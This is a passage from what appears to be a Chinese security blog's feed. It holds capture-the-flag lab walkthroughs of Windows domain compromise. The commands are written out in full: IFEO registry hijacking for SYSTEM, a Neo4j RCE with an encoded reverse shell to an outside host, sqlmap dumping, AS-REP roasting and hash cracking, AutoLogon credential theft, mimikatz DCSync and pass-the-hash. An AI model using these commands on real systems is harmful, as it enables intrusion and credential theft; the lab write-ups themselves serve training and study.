class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">AccessToString          : CREATOR OWNER Allow  FullControl<br>                          NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey<br>                          NT AUTHORITY\SYSTEM Allow  FullControl<br>                          BUILTIN\Administrators Allow  FullControl<br>                          BUILTIN\Users Allow  ReadKey<br>                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey<br></code></pre></td></tr></table></figure><p>其实这里可以理解为Linux中的SUID ，就是这个他这个登录用户是可以修改注册表的权限，利用这个性质，修改注册表映像劫持，使用放大镜进行提权，其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REG ADD <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="hljs-string">&quot;C:\windows\system32\cmd.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446270.png" alt="image">​</p><p>点开就是system权限了，执行一下转发上线的木马即可上CS</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446816.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446972.png" alt="image">​</p><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>紧接着因为已经是system权限了，于是就抓取hash密码看看是否存在域管的hash</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446127.png" alt="image">​</p><p>发现已经抓到域管的hash,直接PTH横向DC即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>502krbtgt3ffd5b58b4a6328659a606c3ea6f9b63514<br>1000DC01$edfd9bc7f992b46770192ac2061e779b532480<br>500Administrator2c9d81bdcf3ec8b1def10328a7cc2f08512<br>1103WIN2016$afd15b54cb6656a397256e0ee0edf5aa16781312<br>1104WIN19-CLIENT$673fb89e10d575157b694e94b0bfff1b16781312<br>1105Aldrich579da618cfbfa85247acf1f800a280a4512<br></code></pre></td></tr></table></figure><p>‍</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains python3 smbexec.py xiaorang.lab/administrator@172.22.8.15 -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446296.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶 - 春秋云境 - TIME</title>
    <link href="/post/spring-and-autumn-clouds-time-rwa9t.html"/>
    <url>/post/spring-and-autumn-clouds-time-rwa9t.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446117.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV 39.99.153.191 -sC -p 22,7687,25,110<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446252.png" alt="image">​</p><p>‍</p><h2 id="Neo4j入口"><a href="#Neo4j入口" class="headerlink" title="Neo4j入口"></a>Neo4j入口</h2><p>‍</p><p>识别出来是Neo4j的RCE直接拿exp打即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar rhino_gadget.jar rmi://39.99.154.21:1337 <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTIuMTM2LjQ2LjI4LzQ5NDkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>得到第一个flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446384.png" alt="image">​</p><p>flag{81ad6506-5a15-432b-9535-02456e6fd528}</p><p>建立隧道代理上传fscan得到结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://152.136.46.28:8000/frpc -o frpc<br>curl http://152.136.46.28:8000/frpc.ini -o frpc.ini<br><br>start infoscan<br>trying RunIcmp2<br>The current user permissions unable to send icmp packets<br>start ping<br>(icmp) Target 172.22.6.12     is alive<br>(icmp) Target 172.22.6.38     is alive<br>(icmp) Target 172.22.6.25     is alive<br>(icmp) Target 172.22.6.36     is alive<br>[*] Icmp alive hosts len is: 4<br>172.22.6.12:88 open<br>172.22.6.25:445 open<br>172.22.6.12:445 open<br>172.22.6.25:139 open<br>172.22.6.25:135 open<br>172.22.6.12:135 open<br>172.22.6.38:80 open<br>172.22.6.38:22 open<br>172.22.6.36:22 open<br>172.22.6.12:139 open<br>172.22.6.36:7687 open<br>[*] alive ports len is: 11<br>start vulscan<br>[*] NetInfo:<br>[*]172.22.6.12<br>   [-&gt;]DC-PROGAME<br>   [-&gt;]172.22.6.12<br>[*] NetInfo:<br>[*]172.22.6.25<br>   [-&gt;]WIN2019<br>   [-&gt;]172.22.6.25<br>[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:后台登录<br>[*] NetBios: 172.22.6.12     [+]DC DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393 <br>[*] NetBios: 172.22.6.25     XIAORANG\WIN2019   <br>[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)<br>[*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None<br>已完成 11/11<br>[*] 扫描结束,耗时: 20.9139746s<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>存在后台</p><p><a href="http://172.22.6.38/index.php">http://172.22.6.38/index.php</a></p><p>只有登录框，一遍丢爆破一边把参数丢sqlmap里头跑一下发现确实存在sql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\sqlmap.py -r .\1.txt -v 3 --proxy=<span class="hljs-string">&quot;socks5://152.136.46.28:7002&quot;</span> -D oa_db -T oa_f1Agggg --dump<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446504.png" alt="image">​</p><p>查表查出flag2</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446625.png" alt="image">​</p><p>flag{b142f5ce-d9b8-4b73-9012-ad75175ba029}</p><p>‍</p><p>‍</p><p>那么在这里先捋一下思路 通过访问了36的页面发现就是本地的ip，所以可以知道应该剩下2台机子</p><p>分别是</p><p>‍</p><p>(icmp) Target 172.22.6.12     is alive<br>(icmp) Target 172.22.6.25     is alive</p><p>‍</p><p>但是只是知道这两台主机是存活且在域内的，没有其他的信息了</p><p>那么接下来就是还是从38身上找答案，当时数据库还有些信息都拖出来发现了一个很奇怪的点</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446769.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446921.png" alt="image">​</p><p>好像都是以一个域名来命名？那么有没有可能是这些用户名和手机号为密码？</p><p>然后这个管理员的账号密码在后台测过了单纯就是一个与数据库的交互仅此而已，所以这个管理员账号应该就是某台主机上的某个密码，所以整理一下密码本来进行密码喷射</p><p>整理好了之后跑了ssh smb等都不行，想了很久也没找到突破口，后来看了一下wp说是</p><p>‍</p><h2 id="突破点flag3-flag4"><a href="#突破点flag3-flag4" class="headerlink" title="突破点flag3&amp;flag4"></a>突破点flag3&amp;flag4</h2><p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示KDC_ERR_C_PRINCIPAL_UNKNOWN，所以当我们没有域凭证时，可以通过Kerberos pre-auth从域外对域用户进行用户枚举</p><p><a href="https://link.zhihu.com/?target=https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><p>也就是通过用户名进行域用户进行爆破，从而获取得到域用户</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446053.png" alt="image">​</p><p>可以发现爆破出了19个用户，然后将这19个用户生成字典来对下面的进行操作</p><h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>对于域用户，如果设置了选项Do not require Kerberos preauthentication(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat或是john对其破解，最终获得该用户的明文口令</p><p>通过这19个用户来进行使用脚本来查看是否存在设置了 不要求Kerberos预身份认证 ，如果存在 ，则可以直接获取域内用户的hash凭据</p><p>通过impacket中的GetNPUsers.py脚本来验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python GetNPUsers.py -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.6</span><span class="hljs-number">.12</span> xiaorang.lab/ -usersfile .\users.txt<br></code></pre></td></tr></table></figure><p>获得两个hash 进行hashcat碰撞解密明文</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446223.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$krb5asrep$23<span class="hljs-variable">$zhangxin</span>@xiaorang.lab@XIAORANG.LAB:b48bec8d2debf89afb6f939bf4374252<span class="hljs-variable">$a42d4d2d0f2c8a066ea89caeb5e0ac6808d0a68b63b6eaaba699bc0a2a6bfbd902f42b42518a87607a7a63005a1cdcc9b5789155d75e29f1022e0ce0311b5880350815d633ccad2cd50e5073df3710db7ba4170e31979b35b435ab29b23e1c8c6f959ec615ea9c92186811f93028e879cc13b646900fd7a50e939679fc8e9a98eba9b8c96279201a981aa07c83079a7f8171f74cf9b808cddca88694615847f6fb7692bacba3672a0e5a8fe390de3a53ae7489b29ee62b284470ce2f58cbea391bdbcaee2d4996225cd284c2822d8c244fe98b15ed0c38ede434286781f76789965c04861f7edd332a8b2eab</span><br></code></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 --force -a 0 <span class="hljs-string">&#x27;$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:b48bec8d2debf89afb6f939bf4374252$a42d4d2d0f2c8a066ea89caeb5e0ac6808d0a68b63b6eaaba699bc0a2a6bfbd902f42b42518a87607a7a63005a1cdcc9b5789155d75e29f1022e0ce0311b5880350815d633ccad2cd50e5073df3710db7ba4170e31979b35b435ab29b23e1c8c6f959ec615ea9c92186811f93028e879cc13b646900fd7a50e939679fc8e9a98eba9b8c96279201a981aa07c83079a7f8171f74cf9b808cddca88694615847f6fb7692bacba3672a0e5a8fe390de3a53ae7489b29ee62b284470ce2f58cbea391bdbcaee2d4996225cd284c2822d8c244fe98b15ed0c38ede434286781f76789965c04861f7edd332a8b2eab&#x27;</span> rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446363.png" alt="image">​</p><p>得到明文</p><p>zhangxin@<code>xiaorang.lab</code>:strawberry</p><p>RDP直接进入到远程中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446504.png" alt="image">​</p><p>这里应该是要继续抓密码往下横向的了</p><p>但其实可以看到有一个特殊的用户叫yuxuan，是根本没有出现过的，所以很有可能这个就是flag3</p><p>上WinPEASany可以抓到yuxuan的密码(当然了这里是抓自动登录的密码 具体为啥提示 不知道 看到域内windows就直接尝试而已)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg query <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\zhangxin\Desktop&gt;reg query <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br><br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>    AutoRestartShell    REG_DWORD    0x1<br>    Background    REG_SZ    0 0 0<br>    CachedLogonsCount    REG_SZ    10<br>    DebugServerCommand    REG_SZ    no<br>    DisableBackButton    REG_DWORD    0x1<br>    EnableSIHostIntegration    REG_DWORD    0x1<br>    ForceUnlockLogon    REG_DWORD    0x0<br>    LegalNoticeCaption    REG_SZ<br>    LegalNoticeText    REG_SZ<br>    PasswordExpiryWarning    REG_DWORD    0x5<br>    PowerdownAfterShutdown    REG_SZ    0<br>    PreCreateKnownFolders    REG_SZ    &#123;A520A1A4-1780-4FF6-BD18-167343C5AF16&#125;<br>    ReportBootOk    REG_SZ    1<br>    Shell    REG_SZ    explorer.exe<br>    ShellCritical    REG_DWORD    0x0<br>    ShellInfrastructure    REG_SZ    sihost.exe<br>    SiHostCritical    REG_DWORD    0x0<br>    SiHostReadyTimeOut    REG_DWORD    0x0<br>    SiHostRestartCountLimit    REG_DWORD    0x0<br>    SiHostRestartTimeGap    REG_DWORD    0x0<br>    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,<br>    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile<br>    WinStationsDisabled    REG_SZ    0<br>    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe<br>    scremoveoption    REG_SZ    0<br>    DisableCAD    REG_DWORD    0x1<br>    LastLogOffEndTimePerfCounter    REG_QWORD    0x91dba849<br>    ShutdownFlags    REG_DWORD    0x80000027<br>    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180<br>    LastUsedUsername    REG_SZ    yuxuan<br>    AutoAdminLogon    REG_SZ    1<br>    DefaultUserName    REG_SZ    yuxuan<br>    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L<br>    DefaultDomainName    REG_SZ    xiaorang.lab<br><br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey<br></code></pre></td></tr></table></figure><p>下图是用WinPEASany</p><p>这里先介绍一下这个WinPEASany到底是干啥用的呢</p><p>winPEAS是一个非常强大的工具，它不仅积极寻找特权升级错误配置，而且还在结果中为用户突出显示它们</p><p>这里直接给出链接 因为文章写的很详细了</p><p><a href="https://cloud.tencent.com/developer/article/2149150">https://cloud.tencent.com/developer/article/2149150</a></p><p>发现有一组 AutoLogon 用户凭据</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446812.png" alt="image">​</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yuxuan@xiaorang.lab<br>Yuxuan7QbrgZ3L<br></code></pre></td></tr></table></figure><p>然后直接登录到这个用户上传mimikaz抓密码就可以抓到域管的密码了</p><p>!!! 这里非常非常重要的一个点！ mimikaz一定一定要是2.2版本的 否则都抓不到，太他妈抽象了真的 搞了一天了</p><p>抓到hash如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br>[DC] <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span> will be the domain<br>[DC] <span class="hljs-string">&#x27;DC-PROGAME.xiaorang.lab&#x27;</span> will be the DC server<br>[DC] Exporting domain <span class="hljs-string">&#x27;xiaorang.lab&#x27;</span><br>[rpc] Service  : ldap<br>[rpc] AuthnSvc : GSS_NEGOTIATE (9)<br>1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512<br>1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512<br>1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512<br>1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512<br>1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512<br>1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512<br>1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512<br>1111    wenbo   9abb7115997ea03785e92542f684bdde        512<br>1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512<br>1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512<br>1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512<br>1117    weicheng        796a774eace67c159a65d6b86fea1d01        512<br>1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512<br>1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512<br>1120    jizhen  1840c5130e290816b55b4e5b60df10da        512<br>1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512<br>1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512<br>1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512<br>1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512<br>1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512<br>1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512<br>1127    chouqian        c6f0585b35de1862f324bc33c920328d        512<br>1128    jicheng 159ee55f1626f393de119946663a633c        512<br>1129    xiyi    ee146df96b366efaeb5138832a75603b        512<br>1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512<br>1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512<br>1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512<br>1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512<br>1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512<br>1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512<br>1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512<br>1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512<br>1138    gaijin  b1040198d43631279a63b7fbc4c403af        512<br>1139    yifu    4836347be16e6af2cd746d3f934bb55a        512<br>1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512<br>1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512<br>1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512<br>1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512<br>1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512<br>1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512<br>1147    lili    b290a36500f7e39beee8a29851a9f8d5        512<br>1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512<br>1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512<br>1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512<br>1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512<br>1152    langying        52a8a125cd369ab16a385f3fcadc757d        512<br>1153    diaocai a14954d5307d74cd75089514ccca097a        512<br>1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512<br>1155    manxue  0255c42d9f960475f5ad03e0fee88589        512<br>1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512<br>1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512<br>1158    louyou  a97ba112b411a3bfe140c941528a4648        512<br>1159    maqun   485c35105375e0754a852cee996ed33b        512<br>1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512<br>1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512<br>1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512<br>1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512<br>1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512<br>1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512<br>1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512<br>1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512<br>1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512<br>1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512<br>1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512<br>1172    dujian  8f7846c78f03bf55685a697fe20b0857        512<br>1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512<br>1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512<br>1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512<br>1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512<br>1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512<br>502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514<br>1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352<br>1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352<br>500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512<br>1000    DC-PROGAME$     b097204ac312b9f7dcb41d7c3338eb74        532480<br>1180    yuxuan  376ece347142d1628632d440530e8eed        66048<br>1181    WIN2019$        727b2b98877e0440226978595c8d0743        4096<br></code></pre></td></tr></table></figure><p>得到管理员的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512<br></code></pre></td></tr></table></figure><p>然后通过管理员的hash进行PTH横向，那么分别横向到域控以及本地管理员</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\smbexec.py XIAORANG/administrator@172.22.6.25 -hashes :04d93ffd6f5f6e4490e0de23f240a5e9<br></code></pre></td></tr></table></figure><p>成功弹会一个system会话 然后再administrator的目录下查找flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446003.png" alt="image">​</p><p>接着就是打域控了</p><p>当然我打域控是直接加了账号密码然后直接rdp登录拿的flag4</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446132.png" alt="image">​</p><p>添加用户登录rdp拿flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446271.png" alt="image">​</p><p>flag04: flag{267d3da9-9e00-4e4d-822b-4b6588364f82}</p><p>最终四个flag都拿到了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>首先入口还是一个CVE直接getshell</li><li>curl走代理谁都会比较简单，上fscan找到web端进行sql的尝试</li><li>在sql注入当中看到很明显的域的名字所以用了一个域外碰撞域内用户的方式去探测域内用户并且用AS-REP的方式抓到域内用户的hash</li><li>得到一个域内用户后通过一个叫WinPEASany的东西(也学到了上来就抓自动登录的用户说不定有奇效)得到另一个域内用户，但恰好这个域内用户是管理组的</li><li>通过新的域管组的用户抓到域管的hash进行PTH就可以横完了</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131446388.png" alt="image">​</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - FastJson系列详解</title>
    <link href="/post/Fastjson%E7%B3%BB%E5%88%97%E8%AF%A6%E8%A7%A3.html"/>
    <url>/post/Fastjson%E7%B3%BB%E5%88%97%E8%AF%A6%E8%A7%A3.html</url>
    
